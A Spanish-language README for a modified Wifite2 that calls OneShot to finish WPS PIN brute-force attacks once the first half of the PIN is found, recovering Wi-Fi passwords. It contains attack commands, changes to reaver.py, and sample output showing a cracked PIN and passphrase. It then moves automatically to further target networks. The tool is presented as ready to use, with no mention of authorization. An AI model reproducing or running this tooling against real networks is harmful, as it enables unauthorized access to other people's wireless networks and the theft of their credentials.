# WIFITE2 + ONESHOT HYBRID

## ¿Qué es esto?

Este es un híbrido de **Wifite2** y **OneShot** que combina lo mejor de ambas herramientas para ataques WPS más eficientes.

## El Problema Original

Wifite detectaba el mensaje **M6** durante ataques WPS, lo que significa que encontraba los **primeros 4 dígitos del PIN**, pero luego se quedaba pegado intentando los últimos 3 dígitos con Reaver, lo cual podía tomar horas.

## La Solución

Cuando Wifite detecta M6 y obtiene los primeros 4 dígitos del PIN:
1. **Detiene Reaver** automáticamente
2. **Llama a OneShot** con el PIN parcial
3. OneShot hace bruteforce **solo de los últimos 3 dígitos** (1,000 combinaciones en lugar de 11,000)
4. **Continúa automáticamente** con la siguiente red después de éxito o fallo

## Flujo de Trabajo

```
┌─────────────────────────────────────────────────────────────┐
│  1. WIFITE escanea redes y detecta WPS habilitado          │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│  2. WIFITE intenta Pixie-Dust (Reaver)                     │
│     - Si funciona: ¡Éxito! → Siguiente red                 │
│     - Si falla: Continúa con PIN Attack                    │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│  3. WIFITE inicia PIN Attack (Reaver)                      │
│     - Intenta PINs hasta detectar M6                       │
│     - M6 = Primeros 4 dígitos correctos                    │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼ (M6 DETECTADO)
┌─────────────────────────────────────────────────────────────┐
│  4. HÍBRIDO: Detiene Reaver, activa ONESHOT                │
│     - Wifite obtiene: MAC + First 4 Digits                 │
│     - Llama a: oneshot.py -i wlan0 -b MAC -p XXXX -B       │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│  5. ONESHOT completa el ataque                             │
│     - Bruteforce solo últimos 3 dígitos (1,000 intentos)  │
│     - Obtiene PIN completo + PSK (contraseña WiFi)         │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│  6. Resultado guardado, continúa con siguiente red         │
└─────────────────────────────────────────────────────────────┘
```

## Archivos Modificados

### `wifite2/wifite/tools/reaver.py`

**Cambios realizados:**

1. **Nuevo import:** `json` (línea 4)

2. **Nuevo método:** `try_oneshot_bruteforce()` (después de `parse_failure`)
   - Detecta la ruta de oneshot.py
   - Construye el comando: `python3 oneshot.py -i INTERFACE -b BSSID -p FIRST4DIGITS -B`
   - Ejecuta OneShot y monitorea el progreso
   - Parsea el output para extraer PIN, PSK y SSID
   - Retorna `CrackResultWPS` si tiene éxito

3. **Loop principal modificado** en `_run()` (línea ~171-235):
   - Agregado flag `oneshot_attempted` para evitar múltiples intentos
   - Nueva condición: Si M6 detectado + first_half_pin disponible + modo PIN Attack
   - Detiene Reaver gracefully
   - Llama a `try_oneshot_bruteforce()`
   - Si OneShot tiene éxito: guarda resultado y continúa
   - Si OneShot falla: lanza excepción para pasar a siguiente red

## Instalación

### Requisitos

1. **Wifite2** (ya lo tienes)
2. **OneShot** (ya lo tienes)
3. **Python 3** (verifica con `python3 --version`)
4. **Dependencias de OneShot:**
   - wpa_supplicant (con soporte WPS)
   - pixiewps

### Verificación de Rutas

El híbrido asume esta estructura:

```
D:\Development\hibrido hack\
├── wifite2\          # Repositorio wifite2 modificado
├── OneShot\          # Repositorio OneShot
│   └── oneshot.py    # Script principal
└── README_HYBRID.md  # Este archivo
```

Si tu estructura es diferente, edita la línea ~348 en `reaver.py`:

```python
oneshot_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
                            '..', 'OneShot', 'oneshot.py')
```

## Uso

### Uso Normal de Wifite

```bash
cd wifite2
sudo python3 wifite.py
```

El híbrido funciona **automáticamente**. No necesitas hacer nada especial.

### Modo Verbose (ver salida de OneShot)

```bash
sudo python3 wifite.py -v -vv
```

Esto mostrará todo el output de OneShot cuando se active.

### Solo ataques WPS

```bash
sudo python3 wifite.py --wps
```

### Ignorar APs bloqueados

```bash
sudo python3 wifite.py --wps-ignore-lock
```

## Ejemplo de Salida

```
[+] Scanning for wireless networks...
[+] Found 5 WPS-enabled networks

 NUM  ESSID             CH  ENCR  PWR  WPS
 ---  ----------------  --  ----  ---  ----
   1  MiWiFi_2.4G       6   WPA2  56db  WPS
   2  TP-LINK_5678      11  WPA2  48db  WPS
...

[+] Select targets (1-5, 'all', or Ctrl+C): 1

[+] Attacking MiWiFi_2.4G (AA:BB:CC:DD:EE:FF)

[+] WPS Pixie-Dust (Reaver)
    [00:00:12] Sending M2 / Running pixiewps
    [!] Failed: Pixie-Dust did not find PIN

[+] WPS PIN Attack (Reaver)
    [00:02:34] Trying PIN (15.32%) First4:1234 Attempts:1532
    [!] M6 detected! First 4 digits: 1234
    [!] Now attacking last 3 digits (1,000 combinations)
    [!] Stopping Reaver, switching to OneShot...

[+] WPS PIN Attack (OneShot)
    [00:00:01] Starting bruteforce with first 4 digits: 1234
    [00:00:45] OneShot bruteforce in progress... (0m 45s)
    [+] OneShot Success! PIN: 12345670 PSK: MySecurePassword123

[+] Cracked MiWiFi_2.4G!
    PIN:  12345670
    PSK:  MySecurePassword123

[+] Continuing to next target...
```

## Ventajas del Híbrido

| Aspecto | Wifite Original | Híbrido Wifite+OneShot |
|---------|----------------|------------------------|
| **Detección M6** | ✅ Detecta, pero no optimiza | ✅ Detecta y optimiza |
| **Tiempo después de M6** | ⏱️ Horas (11,000 PINs) | ⏱️ Minutos (1,000 PINs) |
| **Transición automática** | ❌ Manual | ✅ Automática |
| **Continúa siguiente red** | ✅ Sí | ✅ Sí |
| **Requiere modo monitor** | ❌ No (solo Reaver sí) | ❌ No (OneShot no requiere) |

## Notas Importantes

### 1. **Interfaz de Red**

OneShot **NO requiere modo monitor**, trabaja con la interfaz en modo managed. Sin embargo, Wifite ya pone la interfaz en modo monitor para Reaver, así que no hay problema.

### 2. **Python en Windows (MINGW64)**

Si estás en Windows con MINGW64 y `python3` no funciona, edita línea ~358 en `reaver.py`:

```python
# Cambiar de:
oneshot_cmd = ['python3', oneshot_path, ...]

# A:
oneshot_cmd = ['python', oneshot_path, ...]
```

### 3. **Logs y Debugging**

Los outputs de OneShot se guardan temporalmente en:
```
/tmp/wifite-oneshot.out  (Linux)
%TEMP%\wifite-oneshot.out  (Windows)
```

### 4. **Limitaciones**

- OneShot solo se activa en **modo PIN Attack** (no en Pixie-Dust ni NULL PIN)
- Si OneShot falla, Wifite pasa a la siguiente red (no reintenta con Reaver)
- OneShot requiere que wpa_supplicant esté funcionando correctamente

## Troubleshooting

### Problema: "oneshot.py not found"

**Solución:** Verifica la estructura de carpetas o edita la ruta en `reaver.py` línea ~348

### Problema: "python3: command not found"

**Solución:** Cambia `python3` por `python` en `reaver.py` línea ~358

### Problema: OneShot falla siempre

**Solución:**
1. Verifica que wpa_supplicant funcione: `wpa_supplicant -v`
2. Prueba OneShot manualmente:
   ```bash
   sudo python3 OneShot/oneshot.py -i wlan0 -b AA:BB:CC:DD:EE:FF -K
   ```

### Problema: Wifite se queda pegado en M6

**Solución:**
1. Verifica que los cambios se guardaron en `reaver.py`
2. Asegúrate de estar ejecutando el wifite modificado
3. Usa modo verbose: `sudo python3 wifite.py -v -vv`

## Créditos

- **Wifite2:** https://github.com/derv82/wifite2
- **OneShot:** https://github.com/kimocoder/OneShot
- **Integración:** Híbrido creado para solucionar el problema de M6 detection

## Licencia

Este híbrido mantiene las licencias originales de ambos proyectos.

---

**¡Disfruta de ataques WPS más rápidos y eficientes!** 🚀
